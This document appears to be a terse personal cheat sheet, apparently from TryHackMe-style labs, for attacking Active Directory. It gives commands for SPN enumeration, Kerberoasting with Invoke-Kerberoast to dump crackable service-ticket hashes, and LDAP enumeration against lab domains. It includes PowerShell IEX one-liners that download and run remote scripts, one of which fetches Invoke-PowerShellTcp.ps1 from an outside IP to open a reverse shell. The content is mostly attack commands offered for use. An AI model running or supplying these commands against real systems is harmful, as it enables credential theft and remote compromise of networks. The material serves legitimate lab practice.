# AD services
```text-plain
setspn -T medin -Q ​ */* 
```

we can extract all accounts in the SPN.

SPN is the Service Principal Name, and is the mapping between service and account.

Lets first get the Powershell Invoke-Kerberoast script.

```text-plain
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 

powershell IEX(New-Object Net.webclient).downloadString(\"http://10.8.165.116/Invoke-PowerShellTcp.ps1\")
```

Now lets load this into memory: 

```text-plain
Invoke-Kerberoast -OutputFormat hashcat ​ |fl
```

You should get a SPN ticket.

```text-plain
ldapsearch -x -b "dc=windcorp,dc=thm" -H ldap://10.10.2.199
ldapsearch -H ldap://10.10.172.129 -x -b 'DC=COOCTUS,DC=CORP' -D 'COOCTUS\Visitor' -W
```